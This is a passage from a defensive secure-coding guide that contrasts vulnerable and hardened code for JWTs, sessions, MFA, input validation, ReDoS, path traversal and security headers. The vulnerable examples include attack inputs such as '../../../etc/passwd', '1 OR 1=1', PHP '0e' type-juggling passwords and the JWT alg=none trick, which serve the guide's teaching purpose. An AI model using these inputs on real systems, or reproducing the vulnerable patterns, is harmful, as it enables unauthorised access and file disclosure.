    # Rehash if parameters have changed (transparent upgrade)
    if ph.check_needs_rehash(user['password_hash']):
        new_hash = ph.hash(password)
        with conn.cursor() as cur:
            cur.execute(
                'UPDATE users SET password_hash = %s WHERE id = %s',
                (new_hash, user['id']),
            )
            conn.commit()

    return user
```

### JWT Pitfalls

JSON Web Tokens are widely used for stateless authentication but have well-documented
attack vectors that developers routinely get wrong.

```javascript
// VULNERABLE -- Algorithm confusion attack:
// The JWT header specifies { "alg": "none" }, and the server accepts it.
// The attacker creates a token with no signature, and the server trusts it.

const jwt = require('jsonwebtoken');

// Insecure: accepts any algorithm the token claims to use
const decoded = jwt.verify(token, publicKey);  // If token says alg=none, no signature is verified
```

```javascript
// VULNERABLE -- HS256 with RS256 key confusion:
// Server uses RS256 (asymmetric). The attacker obtains the PUBLIC key,
// creates a token signed with HS256 using the public key as the secret.
// If the server doesn't enforce the algorithm, it verifies HS256(publicKey)
// against the public key -- which succeeds because HS256 is symmetric.

const decoded = jwt.verify(token, publicKey); // Does not enforce algorithm
```

```javascript
// SECURE -- Explicitly specify allowed algorithms and use proper key types.
// Never let the token dictate which algorithm to use.

const jwt = require('jsonwebtoken');
const fs = require('fs');

const PRIVATE_KEY = fs.readFileSync(process.env.JWT_PRIVATE_KEY_PATH);
const PUBLIC_KEY = fs.readFileSync(process.env.JWT_PUBLIC_KEY_PATH);

function createToken(userId, role) {
    return jwt.sign(
        {
            sub: userId,
            role: role,
            iat: Math.floor(Date.now() / 1000),
        },
        PRIVATE_KEY,
        {
            algorithm: 'RS256',           // Explicitly set algorithm
            expiresIn: '15m',             // Short-lived access tokens
            issuer: 'yourapp.com',        // Validate issuer on verify
            audience: 'yourapp.com/api',  // Validate audience on verify
        }
    );
}

function verifyToken(token) {
    try {
        return jwt.verify(token, PUBLIC_KEY, {
            algorithms: ['RS256'],        // ONLY accept RS256 -- blocks none and HS256
            issuer: 'yourapp.com',
            audience: 'yourapp.com/api',
            clockTolerance: 30,           // 30 seconds clock skew tolerance
        });
    } catch (err) {
        return null;  // Token is invalid, expired, or tampered
    }
}
```

```javascript
// SECURE -- Refresh token rotation pattern:
// Access tokens are short-lived (15 min). Refresh tokens are long-lived (7 days)
// but single-use. On each refresh, the old refresh token is invalidated and
// a new pair is issued. If a stolen refresh token is replayed, both the
// attacker's and the legitimate user's session are invalidated (theft detection).

async function refreshTokens(refreshToken) {
    // Look up the refresh token in the database
    const stored = await db.query(
        'SELECT id, user_id, is_used FROM refresh_tokens WHERE token = $1',
        [refreshToken]
    );

    if (!stored.rows[0]) {
        return null; // Unknown token
    }

    if (stored.rows[0].is_used) {
        // This refresh token was already used -- possible theft.
        // Revoke ALL refresh tokens for this user as a safety measure.
        await db.query('DELETE FROM refresh_tokens WHERE user_id = $1', [stored.rows[0].user_id]);
        return null;
    }

    // Mark the current refresh token as used (single-use enforcement)
    await db.query('UPDATE refresh_tokens SET is_used = true WHERE id = $1', [stored.rows[0].id]);

    // Issue new token pair
    const newAccessToken = createToken(stored.rows[0].user_id);
    const newRefreshToken = crypto.randomBytes(32).toString('hex');

    await db.query(
        'INSERT INTO refresh_tokens (user_id, token, expires_at) VALUES ($1, $2, $3)',
        [stored.rows[0].user_id, newRefreshToken, new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)]
    );

    return { accessToken: newAccessToken, refreshToken: newRefreshToken };
}
```

### Multi-Factor Authentication Patterns

```python
# TOTP (Time-based One-Time Password) implementation using pyotp
# This is the same algorithm used by Google Authenticator, Authy, etc.

import pyotp
import qrcode
import io
import base64

def enable_mfa(user_id: int) -> dict:
    """Generate a TOTP secret and QR code for the user to scan."""
    # Generate a random 160-bit secret (base32 encoded)
    secret = pyotp.random_base32()

    # Store the secret encrypted in the database (NOT plaintext)
    # The secret is equivalent to a password -- protect it accordingly.
    store_encrypted_mfa_secret(user_id, secret)

    # Generate the provisioning URI for QR code
    totp = pyotp.TOTP(secret)
    uri = totp.provisioning_uri(
        name=get_user_email(user_id),
        issuer_name='YourApp'
    )

    return {'secret': secret, 'qr_uri': uri}

def verify_mfa_code(user_id: int, code: str) -> bool:
    """Verify a TOTP code with a 1-step window to allow clock drift."""
    secret = get_decrypted_mfa_secret(user_id)
    totp = pyotp.TOTP(secret)

    # valid_window=1 accepts codes from 30 seconds ago and 30 seconds ahead.
    # This accommodates minor clock differences between server and authenticator app.
    return totp.verify(code, valid_window=1)
```

---

## Session Management

Secure session management prevents session hijacking, fixation, and replay attacks.
The session ID is the key to the kingdom -- if stolen, the attacker IS the user.

```php
// SECURE -- PHP: Comprehensive session hardening

// php.ini or runtime configuration
ini_set('session.cookie_httponly', 1);    // JavaScript cannot access the cookie
ini_set('session.cookie_secure', 1);     // Only sent over HTTPS
ini_set('session.cookie_samesite', 'Lax'); // CSRF mitigation
ini_set('session.use_strict_mode', 1);   // Reject uninitialized session IDs
ini_set('session.use_only_cookies', 1);  // Block session ID in URL
ini_set('session.gc_maxlifetime', 1800); // 30-minute idle timeout

session_start();

// CRITICAL: Regenerate session ID after login to prevent session fixation.
// Session fixation: attacker sets a known session ID in the victim's browser
// BEFORE login. After the victim authenticates, the attacker uses the same
// session ID to access the authenticated session.

function loginUser(PDO $pdo, string $email, string $password): bool {
    $user = verifyUser($pdo, $email, $password);
    if (!$user) {
        return false;
    }

    // Destroy the old session and create a new one with a fresh ID.
    // true = delete the old session file on disk.
    session_regenerate_id(true);

    $_SESSION['user_id'] = $user['id'];
    $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];       // For anomaly detection
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];   // For anomaly detection
    $_SESSION['last_activity'] = time();
    $_SESSION['created_at'] = time();

    return true;
}

function validateSession(): bool {
    if (!isset($_SESSION['user_id'])) {
        return false;
    }

    // Idle timeout: 30 minutes of inactivity
    if (time() - $_SESSION['last_activity'] > 1800) {
        session_destroy();
        return false;
    }

    // Absolute timeout: 4 hours maximum session lifetime regardless of activity
    if (time() - $_SESSION['created_at'] > 14400) {
        session_destroy();
        return false;
    }

    // Anomaly detection: IP or User-Agent changed mid-session
    if ($_SESSION['ip_address'] !== $_SERVER['REMOTE_ADDR'] ||
        $_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
        session_destroy();
        return false;
    }

    $_SESSION['last_activity'] = time();
    return true;
}

function logoutUser(): void {
    $_SESSION = [];

    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(
            session_name(),
            '',
            time() - 42000,       // Expire the cookie
            $params['path'],
            $params['domain'],
            $params['secure'],
            $params['httponly']
        );
    }

    session_destroy();
}
```

```javascript
// SECURE -- Express: Session configuration with express-session and Redis store.
// Redis is used because the default MemoryStore leaks memory and does not
// work across multiple server instances.

const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

const redisClient = createClient({ url: process.env.REDIS_URL });
redisClient.connect();

app.use(session({
    store: new RedisStore({ client: redisClient }),
    name: '__session',              // Custom cookie name (not the default 'connect.sid')
    secret: process.env.SESSION_SECRET,
    resave: false,                  // Don't re-save unchanged sessions
    saveUninitialized: false,       // Don't create sessions until data is stored
    rolling: true,                  // Reset expiry on every request (sliding window)
    cookie: {
        httpOnly: true,             // Not accessible via JavaScript
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: 30 * 60 * 1000,     // 30-minute idle timeout
        path: '/',
        domain: process.env.COOKIE_DOMAIN,
    },
}));

// Regenerate session ID after login
app.post('/login', async (req, res) => {
    const user = await verifyCredentials(req.body.email, req.body.password);
    if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Regenerate to prevent session fixation
    req.session.regenerate((err) => {
        if (err) return res.status(500).json({ error: 'Session error' });

        req.session.userId = user.id;
        req.session.createdAt = Date.now();
        req.session.save((err) => {
            if (err) return res.status(500).json({ error: 'Session save error' });
            res.json({ message: 'Logged in' });
        });
    });
});

// Logout: destroy the session and clear the cookie
app.post('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) return res.status(500).json({ error: 'Logout failed' });
        res.clearCookie('__session');
        res.json({ message: 'Logged out' });
    });
});
```

```python
# SECURE -- Django: Session configuration in settings.py
# Django uses database-backed sessions by default. For production, use
# cached sessions (Redis/Memcached) for better performance.

# settings.py
SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'
SESSION_CACHE_ALIAS = 'sessions'  # Dedicated Redis cache for sessions
SESSION_COOKIE_HTTPONLY = True     # JS cannot read the session cookie
SESSION_COOKIE_SECURE = True      # HTTPS only in production
SESSION_COOKIE_SAMESITE = 'Lax'
SESSION_COOKIE_AGE = 1800         # 30-minute max age
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
SESSION_COOKIE_NAME = '__session'

# In views.py -- regenerate session after login:
from django.contrib.auth import authenticate, login
from django.contrib.sessions.backends.db import SessionStore

def login_view(request):
    user = authenticate(request, username=request.POST['email'], password=request.POST['password'])
    if user is None:
        return JsonResponse({'error': 'Invalid credentials'}, status=401)

    # Django's login() calls request.session.cycle_key() internally,
    # which regenerates the session ID to prevent fixation.
    login(request, user)

    return JsonResponse({'message': 'Logged in'})
```

---

## Input Validation Patterns

Every piece of user input is hostile until validated. Input validation is the first
line of defense and must happen at the boundary where external data enters the system.

### Allowlist vs Blocklist

```python
# VULNERABLE -- Blocklist approach: trying to block known-bad patterns.
# Blocklists are inherently incomplete. Attackers find bypasses.

def validate_filename(filename: str) -> bool:
    # Trying to block directory traversal by banning ".."
    blocked = ['..', '/', '\\', '\x00', '~']
    for pattern in blocked:
        if pattern in filename:
            return False
    return True
    # Bypass: URL-encoded "../" as "%2e%2e%2f" or double-encoding "%252e%252e%252f"
    # Bypass: Unicode normalization "\..\\" on Windows
```

```python
# SECURE -- Allowlist approach: only permit known-good patterns.
# Define exactly what a valid filename looks like. Reject everything else.

import re
import os

def validate_filename(filename: str) -> bool:
    # Only allow alphanumeric characters, hyphens, underscores, and a single dot
    # for the extension. Maximum 255 characters.
    if not re.match(r'^[a-zA-Z0-9_-]{1,200}\.[a-zA-Z0-9]{1,10}$', filename):
        return False

    # Additionally resolve the path and ensure it stays within the upload directory
    base_dir = os.path.realpath('/var/uploads')
    target = os.path.realpath(os.path.join(base_dir, filename))

    # The resolved path must start with the base directory
    if not target.startswith(base_dir + os.sep):
        return False

    return True
```

### Type Coercion Attacks

```php
// VULNERABLE -- PHP: Loose comparison (==) with type juggling.
// PHP's loose comparison converts strings to numbers in surprising ways.

$password = $_POST['password'];
$storedHash = getStoredHash($username);

if ($password == $storedHash) {  // == is loose comparison
    loginUser();
}
// Attack: If $storedHash is "0e12345..." (scientific notation of zero),
// and attacker sends password "0" or "0e99999", PHP evaluates:
// "0e12345" == "0e99999" --> 0 == 0 --> true
// The attacker bypasses the password check.
```

```php
// SECURE -- PHP: Always use strict comparison (===) and proper password verification.
// Strict comparison checks both type and value.

$password = $_POST['password'];
$storedHash = getStoredHash($username);

// password_verify is timing-safe and handles the comparison correctly
if (password_verify($password, $storedHash)) {
    loginUser();
}

// For non-password comparisons, use === (strict)
if ($userRole === 'admin') {  // Strict: no type juggling
    grantAdminAccess();
}
```

```javascript
// VULNERABLE -- JavaScript: parseInt stops at first non-numeric character.
// The attacker sends "1 OR 1=1" and parseInt returns 1 -- the injection payload
// may pass through other layers that don't re-validate.

app.get('/api/users/:id', (req, res) => {
    const userId = parseInt(req.params.id); // parseInt("1 OR 1=1") returns 1
    // But if userId is interpolated elsewhere without parameterization...
});
```

```javascript
// SECURE -- JavaScript: Validate the entire input matches the expected format.
// Use Number() or explicit regex validation, not parseInt.

app.get('/api/users/:id', (req, res) => {
    const raw = req.params.id;

    // Strict validation: must be digits only, reasonable length
    if (!/^\d{1,10}$/.test(raw)) {
        return res.status(400).json({ error: 'Invalid user ID format' });
    }

    const userId = Number(raw);
    if (!Number.isInteger(userId) || userId <= 0) {
        return res.status(400).json({ error: 'Invalid user ID' });
    }

    // Now userId is guaranteed to be a positive integer
});
```

### Regular Expression Denial of Service (ReDoS)

Poorly written regular expressions can cause catastrophic backtracking, where the regex
engine tries exponentially many paths to match (or fail to match) a crafted input.

```javascript
// VULNERABLE -- This regex has catastrophic backtracking.
// The nested quantifiers (a+)+ create exponential time complexity.
// Input: "aaaaaaaaaaaaaaaaaaaaaaaa!" takes minutes to evaluate.

const emailRegex = /^([a-zA-Z0-9]+)+@[a-zA-Z0-9]+\.[a-zA-Z]+$/;

function validateEmail(email) {
    return emailRegex.test(email);
    // Attacker sends: "aaaaaaaaaaaaaaaaaaaaaaaaa@" (no TLD)
    // The regex engine backtracks 2^25 times trying to find a match.
    // The server thread is blocked, causing denial of service.
}
```

```javascript
// SECURE -- Use atomic grouping principles: avoid nested quantifiers.
// Or use a well-tested library for email validation instead of regex.

// Option 1: Simple, non-backtracking email check
function validateEmail(email) {
    // Basic structural check -- not trying to be RFC 5322 compliant
    if (email.length > 254) return false; // Max email length per RFC
    const parts = email.split('@');
    if (parts.length !== 2) return false;
    if (parts[0].length === 0 || parts[0].length > 64) return false;
    if (parts[1].length === 0 || parts[1].length > 253) return false;
    if (!parts[1].includes('.')) return false;
    return true;
}

// Option 2: Use a library that handles edge cases
// npm install validator
const validator = require('validator');
if (validator.isEmail(userInput)) { /* valid */ }

// Option 3: If you must use regex, set a timeout or use RE2 (linear-time engine)
// npm install re2
const RE2 = require('re2');
const safeRegex = new RE2('^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$');
```

### Path Traversal Prevention

```python
# VULNERABLE -- Python: User-controlled filename used to read files.
# The attacker sends: filename=../../../etc/passwd
# os.path.join does NOT prevent traversal when the second argument starts with ../

import os
from flask import request, send_file

@app.route('/download')
def download():
    filename = request.args.get('file')
    filepath = os.path.join('/var/app/uploads', filename)
    return send_file(filepath)
    # Attacker request: /download?file=../../../etc/passwd
    # filepath resolves to /etc/passwd -- the server leaks the system file.
```

```python
# SECURE -- Python: Resolve the path and verify it stays within the allowed directory.
# Use os.path.realpath to collapse all ../ and symlinks, then check the prefix.

import os
from pathlib import Path
from flask import request, send_file, abort

UPLOAD_DIR = Path('/var/app/uploads').resolve()

@app.route('/download')
def download():
    filename = request.args.get('file', '')

    # Step 1: Strip any directory separators from the filename itself
    # This prevents the attacker from including path components
    safe_name = os.path.basename(filename)

    # Step 2: Construct the full path and resolve symlinks
    target = (UPLOAD_DIR / safe_name).resolve()

    # Step 3: Verify the resolved path is still under UPLOAD_DIR
    # This catches symlink attacks where a file inside uploads/ points outside
    if not str(target).startswith(str(UPLOAD_DIR) + os.sep):
        abort(404)

    # Step 4: Verify the file actually exists
    if not target.is_file():
        abort(404)

    return send_file(target)
```

```php
// SECURE -- PHP: Path traversal prevention for file downloads

function secureDownload(string $requestedFile): void {
    $uploadDir = realpath('/var/app/uploads');

    // basename() strips directory components, turning "../../../etc/passwd" into "passwd"
    $safeName = basename($requestedFile);

    $targetPath = realpath($uploadDir . DIRECTORY_SEPARATOR . $safeName);

    // realpath() returns false if the file doesn't exist
    if ($targetPath === false) {
        http_response_code(404);
        exit('File not found');
    }

    // Verify the resolved path starts with the upload directory
    if (strpos($targetPath, $uploadDir . DIRECTORY_SEPARATOR) !== 0) {
        http_response_code(403);
        exit('Access denied');
    }

    // Set proper headers to prevent MIME sniffing
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $safeName . '"');
    header('X-Content-Type-Options: nosniff');
    header('Content-Length: ' . filesize($targetPath));

    readfile($targetPath);
    exit;
}
```

---

## Quick Reference: Security Headers

Every web application should set these response headers. They cost nothing and
prevent entire classes of attacks.

```
# Comprehensive security headers -- set on every response

# Prevent MIME type sniffing (stops browser from executing uploaded files as scripts)
X-Content-Type-Options: nosniff

# Block page from being embedded in frames (prevents clickjacking)
X-Frame-Options: DENY

# Enable XSS filter in older browsers (modern browsers use CSP instead)
X-XSS-Protection: 0

# Control what information is sent in the Referer header
Referrer-Policy: strict-origin-when-cross-origin

# Enforce HTTPS for 1 year, including subdomains
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Restrict browser features available to the page
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()

# Content Security Policy (see XSS section for detailed configuration)
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'

# Prevent embedding in cross-origin contexts
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

```javascript
// Node.js/Express: Using helmet to set security headers automatically
const helmet = require('helmet');

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'"],
            imgSrc: ["'self'", 'data:', 'https:'],
            connectSrc: ["'self'"],
            frameSrc: ["'none'"],
            objectSrc: ["'none'"],
            baseUri: ["'self'"],
        },
    },
    crossOriginOpenerPolicy: { policy: 'same-origin' },
    crossOriginResourcePolicy: { policy: 'same-origin' },
    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));
```

```python
# Django: Security settings in settings.py

# HTTPS enforcement
SECURE_SSL_REDIRECT = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True

# Cookie security
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True

# Headers
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'
SECURE_CROSS_ORIGIN_OPENER_POLICY = 'same-origin'

# CSP via django-csp
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)
CSP_STYLE_SRC = ("'self'",)
CSP_IMG_SRC = ("'self'", 'data:', 'https:')
CSP_FRAME_SRC = ("'none'",)
CSP_OBJECT_SRC = ("'none'",)
```

```php
// Laravel: Security headers middleware

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class SecurityHeaders
{
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);

        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('X-XSS-Protection', '0');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
        $response->headers->set('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=()');
        $response->headers->set('Cross-Origin-Opener-Policy', 'same-origin');
        $response->headers->set('Cross-Origin-Resource-Policy', 'same-origin');

        return $response;
    }
}

// Register in app/Http/Kernel.php under $middleware (global):
// \App\Http\Middleware\SecurityHeaders::class,
```

---

## Checklist: Before Deploying Any Web Application

Use this checklist as a final gate before any production deployment.

- [ ] All user inputs are validated with allowlist patterns
- [ ] All SQL queries use parameterized statements (no string concatenation)
- [ ] All HTML output is escaped or sanitized (context-aware encoding)
- [ ] CSP header is configured with nonce-based script loading
- [ ] CSRF tokens are required on all state-changing requests
- [ ] Passwords are hashed with bcrypt (cost >= 12) or argon2id
- [ ] Sessions regenerate ID after authentication
- [ ] Session cookies have HttpOnly, Secure, and SameSite=Lax flags
- [ ] JWT tokens specify algorithm explicitly on verify (never trust the header)
- [ ] SSRF protection validates URLs and blocks internal/private IP ranges
- [ ] File uploads validate type, size, name, and store outside webroot
- [ ] Error pages do not leak stack traces, SQL queries, or file paths
- [ ] Security headers (HSTS, CSP, X-Content-Type-Options, etc.) are set
- [ ] Dependencies are audited for known CVEs (npm audit, composer audit)
- [ ] Rate limiting is configured on authentication and API endpoints
- [ ] Logging captures authentication events, access denials, and input anomalies
- [ ] HTTPS is enforced with proper TLS configuration (TLS 1.2+ only)
- [ ] Secrets are in environment variables, never in source code
